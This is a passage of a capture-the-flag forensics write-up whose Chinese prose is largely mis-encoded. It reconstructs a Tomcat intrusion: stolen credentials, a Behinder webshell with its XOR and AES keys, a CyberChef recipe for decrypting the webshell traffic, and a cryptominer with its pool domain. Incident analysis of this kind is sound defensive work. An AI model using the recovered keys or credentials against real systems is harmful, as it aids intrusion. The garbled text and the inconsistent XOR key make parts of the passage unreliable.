from base64åå¯¼å‡ºexeï¼Œå¹¶è¿›è¡Œidaåˆ†æï¼Œä¾æ¬¡æäº¤curl_xxxï¼Œæ­£ç¡®ç­”æ¡ˆä¸º`curl_easy_init`

(9)

äº¤ç»™GPTåˆ†æä¸€ä¸‹ï¼Œå¾—åˆ°`RC4`

![image-20241118103729096](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241118103729096.png?imageSlim)

(10)`192.168.57.119:6000`

![image-20241118104622364](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241118104622364.png?imageSlim)

(11)AES

(12)è¿½è¸ªTCPæµ

![image-20241118105111995](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241118105111995.png?imageSlim)

(13)

æ ¹æ®User-Agent: orca/1.0ï¼Œç›´æ¥æ‰¾åˆ°shellcodeçš„é¡¹ç›®

https://github.com/Ptkatz/OrcaC2/tree/master/Orca_Master



### Master of DFIR - Coffee

```
æ¬¢è¿æ¥åˆ°MasterÂ ofÂ DFIRÂ -Â â˜•Â ,æˆ‘ä»¬éœ€è¦å¸®åŠ©ä½ è°ƒæŸ¥ä»¥ä¸‹ä»»åŠ¡.å¹¶ä¸”æäº¤è¿™äº›ä»»åŠ¡çš„æ­£ç¡®ç­”æ¡ˆ,æˆ‘ä»¬å°†ä¼šç»™ä½ flagğŸ¤”
éœ€è¦è¾“å…¥TeamÂ Tokenå³å¯å¼€å§‹
TeamÂ tokenÂ >Â xxx
(1/9)Â å—å®³è€…ä¸»æœºåæ˜¯ä»€ä¹ˆ?Â ç¤ºä¾‹:DESKTOP-J6QZVBD
è¯·è¾“å…¥ä½ çš„ç­”æ¡ˆÂ >Â DESKTOP-28DGVAU
æ­£ç¡®âœ…!
(2/9)Â æ§åˆ¶ç«¯ClientIdæ˜¯å¤šå°‘?Â ç¤ºä¾‹:c723d01b-5dc1-2601
è¯·è¾“å…¥ä½ çš„ç­”æ¡ˆÂ >Â a55330f4-83c2-4081
æ­£ç¡®âœ…!
(3/9)Â æ”»å‡»è€…ä¸‹è½½çš„æ–‡ä»¶çš„ä¿å­˜åæ˜¯ä»€ä¹ˆï¼ŸÂ ç¤ºä¾‹:flag.txt
è¯·è¾“å…¥ä½ çš„ç­”æ¡ˆÂ >Â history
æ­£ç¡®âœ…!
(4/9)Â tomcatçš„ç”¨æˆ·åå’Œå¯†ç æ˜¯å¤šå°‘?Â ç¤ºä¾‹:admin:admin
è¯·è¾“å…¥ä½ çš„ç­”æ¡ˆÂ >Â tomcat:beautiful
æ­£ç¡®âœ…!
(5/9)Â æ”»å‡»è€…ä¸Šä¼ çš„æ–‡ä»¶å?Â ç¤ºä¾‹:flag.txt
è¯·è¾“å…¥ä½ çš„ç­”æ¡ˆÂ >Â help.war
æ­£ç¡®âœ…!
(6/9)Â é»‘å®¢ä½¿ç”¨webshellç®¡ç†å·¥å…·æ˜¯ä»€ä¹ˆ?Â (æ³¨æ„:å…¨å°å†™)Â ç¤ºä¾‹:antsword
è¯·è¾“å…¥ä½ çš„ç­”æ¡ˆÂ >Â behinder
æ­£ç¡®âœ…!
(7/9)Â è¢«é»‘å®¢çªƒå–çš„äº‘å­˜å‚¨æœåŠ¡çš„ç®¡ç†å‘˜è´¦æˆ·å’Œå¯†ç æ˜¯å¤šå°‘?
è¯·è¾“å…¥ä½ çš„ç­”æ¡ˆÂ >Â  hhcloud:vipvip123
æ­£ç¡®âœ…!
(8/9)Â æŒ–çŸ¿ç¨‹åºè½åœ°çš„æ–‡ä»¶æ˜¯ä»€ä¹ˆï¼Ÿ ç¤ºä¾‹:miner.exe
è¯·è¾“å…¥ä½ çš„ç­”æ¡ˆÂ >Â sys_update.exe
æ­£ç¡®âœ…!
(9/9)Â è¯¥æŒ–çŸ¿ç¨‹åºå›è¿çš„çŸ¿æ± åŸŸåæ˜¯ä»€ä¹ˆ?Â ç¤ºä¾‹:www.baidu.com
è¯·è¾“å…¥ä½ çš„ç­”æ¡ˆÂ >Â auto.skypool.xyz
æ­£ç¡®âœ…!
æ­å–œä½ å®Œæˆäº†æ‰€æœ‰ä»»åŠ¡,è¿™æ˜¯ä½ çš„flagÂ ğŸš©Â -->Â Â 
```

ç”±Phishingå¾—åˆ°aesåŠ å¯†çš„keyä¸º`pJB`-v)t^ZAsP$|r`

1.å—å®³è€…ä¸»æœºåæ˜¯ä»€ä¹ˆ?

```
DESKTOP-28DGVAU
```

![image-20241118115841092](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241118115841092.png?imageSlim)

![image-20241118115847532](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241118115847532.png?imageSlim)

2.æ§åˆ¶ç«¯ClientIdæ˜¯å¤šå°‘?

```
a55330f4-83c2-4081
```

3.æ”»å‡»è€…ä¸‹è½½çš„æ–‡ä»¶çš„ä¿å­˜åæ˜¯ä»€ä¹ˆï¼Ÿ

```
history
```

![image-20241118120209177](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241118120209177.png?imageSlim)![image-20241118120226792](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241118120226792.png?imageSlim)

4.tomcatçš„ç”¨æˆ·åå’Œå¯†ç æ˜¯å¤šå°‘? 

```
tomcat:beautiful
```

![image-20241118121156346](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241118121156346.png?imageSlim)

5.æ”»å‡»è€…ä¸Šä¼ çš„æ–‡ä»¶å? 

```
help.war
```

![image-20241118151912404](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241118151912404.png?imageSlim)

(6)é»‘å®¢ä½¿ç”¨webshellç®¡ç†å·¥å…·æ˜¯ä»€ä¹ˆ? 

```
behinder
```

![image-20241118171549389](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241118171549389.png?imageSlim)

å¯¼å‡ºshell.warï¼Œè§£å‹ï¼Œä½¿ç”¨è“é˜Ÿå·¥å…·ç®±è§£ç help.jspçš„éƒ¨åˆ†å­—ç¬¦ä¸²

![image-20241118171710367](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241118171710367.png?imageSlim)

![image-20241118171951675](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241118171951675.png?imageSlim)

æ ¹æ®æµé‡ç‰¹å¾

XOR+AES-ECB/PCKS5åŠ å¯†çš„classæ”»å‡»è½½è·

```
 String xor_key = "82ca9b43c1b8ef8c";
 
 String key = "b42e327feb5d923b";

```

(7)è¢«é»‘å®¢çªƒå–çš„äº‘å­˜å‚¨æœåŠ¡çš„ç®¡ç†å‘˜è´¦æˆ·å’Œå¯†ç æ˜¯å¤šå°‘?

```
hhcloud:vipvip123
```

æ¥ä¸‹æ¥å¯ä»¥å¯¹æµé‡è¿›è¡Œè§£å¯†

```
https://cyberchef.cn/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)XOR(%7B'option':'UTF8','string':'2ca9b43c1b8ef8c8'%7D,'Standard',false)AES_Decrypt(%7B'option':'UTF8','string':'b42e327feb5d923b'%7D,%7B'option':'Hex','string':''%7D,'ECB/NoPadding','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)Zlib_Inflate(0,0,'Adaptive',false,false)&input=
```

![image-20241118174535169](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241118174535169.png?imageSlim)

å¾—åˆ°ä¸€ä¸ªæ•°æ®åº“æ–‡ä»¶

![image-20241118174632379](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241118174632379.png?imageSlim)

![image-20241118175136465](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241118175136465.png?imageSlim)

![image-20241118175301083](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241118175301083.png?imageSlim)

[md5åœ¨çº¿è§£å¯†ç ´è§£,md5è§£å¯†åŠ å¯†](https://www.cmd5.com/default.aspx)

(8)æŒ–çŸ¿ç¨‹åºè½åœ°çš„æ–‡ä»¶æ˜¯ä»€ä¹ˆï¼Ÿ

```
 sys_update.exe
```

![image-20241118234253723](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241118234253723.png?imageSlim)

![image-20241118234257796](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241118234257796.png?imageSlim)



(9)è¯¥æŒ–çŸ¿ç¨‹åºå›è¿çš„çŸ¿æ± åŸŸåæ˜¯ä»€ä¹ˆ?

```
auto.skypool.xyz
```

![image-20241118232801010](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241118232801010.png?imageSlim)

